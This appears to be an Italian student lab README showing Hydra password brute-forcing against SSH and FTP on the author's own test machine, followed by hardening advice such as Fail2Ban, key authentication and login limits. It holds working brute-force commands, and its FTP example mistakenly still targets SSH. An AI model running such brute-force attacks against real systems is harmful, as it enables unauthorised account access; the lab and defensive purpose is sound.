# **HYDRA**🐉
[Hydra](https://www.kali.org/tools/hydra/) è uno strumento usato per il cracking di password, è molto apprezzato dagli utenti kali per via
della sua presenza su diversi protoccolli di rete come:  FTP, SMB, POP3, IMAP, MySQL, VNC, SSH, HTTP(S) e altri...

## **Indice**
1. [SSH](#ssh-cracking)
2. [FTP](#ftp-cracking)
3. [Prevenzioni FTP](#prevenzioni-ftp)
4. [Prevenzioni SSH](#prevenzioni-ssh) 

## **SSH cracking**
Creo un nuovo utente + nome “adduser test_user”
```bash
adduser test_use
#Inserisci la password
```
Avvio servizio
```bash
sudo service start ssh
```
Check connessione
```bash
ssh test_user@192.168.56.102
#la connessione chiede una password... è il momento di usare hydra
```
Hydra
```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.102 -t 4 ssh
```

Risultato<br>
➡️[Password trovata](https://github.com/OctavianIT/Octavian_Ceresau_HydraCrack/blob/main/Octavian_Ceresau_Hydra/Altro/ssh/Password.png)


## **FTP cracking**
Installazione FTP
```bash
sudo apt update && sudo apt-get install vsftpd -y
```
Avvio servizio
```bash
sudo service start vsftpd
```
Check connessione
```bash
ftp 192.168.56.102
#la connessione chiede una password... è il momento di usare hydra
```
Hydra
```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.102 -t 4 ssh -V
#aggiungo la modalità verbosa
```
Risultato<br>
➡️[Password trovata](https://github.com/OctavianIT/Octavian_Ceresau_HydraCrack/blob/main/Octavian_Ceresau_Hydra/Altro/ftp/Trovato.png)

## **Prevenzioni FTP**
#### **No FTP** 🛡️​
FTP di base è un protocollo non crittografato questo lo rende vulnerabile ad attacchi come il
MITM (man in the middle). Meglio usare protocolli come FTPS e SFTP

#### **Max Access** 🛡️​
Limitare nell’area di .config un numero massimo di accessi
```bash
max_login_fails=3
```

#### **No anonym** 🛡️​
Non attivare l’accesso anonimo… meglio sempre chiedere all’utente di autenticarsi con
credenziali valide e soprattutto esistenti

#### **Password** 🛡️​
Utilizzare password forti… almeno 12 caratteri alternati con simboli, numeri, maiuscole,
minuscole

## **Prevenzioni SSH**
#### **Porta** 🛡️​
Cambiare la connessione standard dalla porta 22 (è una porta molto soggetta a scansioni)

#### **No Password** 🛡️​
Usare un’autenticazione a chiave piuttosto che una password

#### **Fail2Ban** 🛡️​
Usare Fail2Ban che si può facilmente installare e configurare… questo permetterà il ban
degli ip dopo svariati tentativi di accessi sbagliati








